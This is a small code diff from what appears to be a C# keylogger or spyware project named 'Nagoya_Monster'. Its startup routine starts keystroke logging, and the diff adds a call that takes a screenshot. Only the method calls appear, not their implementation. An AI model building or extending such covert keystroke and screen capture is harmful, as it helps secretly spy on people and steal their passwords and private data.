@@ -40,6 +40,7 @@ namespace Nagoya_Monster
         {
             Log.Add("Nagoya Monster Started");
             Keylog.Start();
+            Screenshot.TakeScreenShot();
         }
     }
 }
